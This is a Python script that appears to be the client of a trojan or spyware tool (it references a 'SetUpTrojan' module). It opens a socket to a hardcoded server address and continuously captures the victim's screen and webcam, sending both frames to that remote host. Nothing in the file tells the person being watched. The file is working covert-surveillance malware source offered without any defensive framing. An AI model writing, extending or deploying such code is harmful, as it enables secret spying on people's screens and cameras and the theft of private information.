import socket
import pickle
import struct
import threading
import io
from PIL import ImageGrab
import cv2
from moviepy.editor import VideoFileClip
import os
import yt_dlp
#from SetUpTrojan import load_ip_from_file

def stream_screen_and_camera(client_socket):
    cap = cv2.VideoCapture(0)

    try:
        while True:
            try:
                client_socket.settimeout(1)
                command = client_socket.recv(4096).decode()
            except socket.timeout:
                pass

            screen = ImageGrab.grab()
            screen = screen.resize((640, 480))

            ret, camera_frame = cap.read()
            if not ret:
                break

            with io.BytesIO() as buffer:
                screen.save(buffer, format="JPEG")
                screen_data = buffer.getvalue()

            camera_data = pickle.dumps(camera_frame)

            screen_message_size = struct.pack("!L", len(screen_data))
            client_socket.sendall(screen_message_size + screen_data)

            camera_message_size = struct.pack("!L", len(camera_data))
            client_socket.sendall(camera_message_size + camera_data)

    except Exception as e:
        print(f'Error: {e}')
    finally:
        cap.release()
        client_socket.close()

def main():
    SERVER_IP = "192.168.1.69"  # Замените на IP сервера
    SERVER_PORT = 5000          # Порт сервера

    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_IP, SERVER_PORT))
        
        # Запуск потока для стриминга экрана и камеры
        stream_thread = threading.Thread(target=stream_screen_and_camera, args=(client_socket,))
        stream_thread.start()
        stream_thread.join()  # Ждем завершения потока стриминга

    except Exception as e:
        print(f'Error: {e}')
    finally:
        if 'client_socket' in locals():
            client_socket.close()

if __name__ == '__main__':
    main()
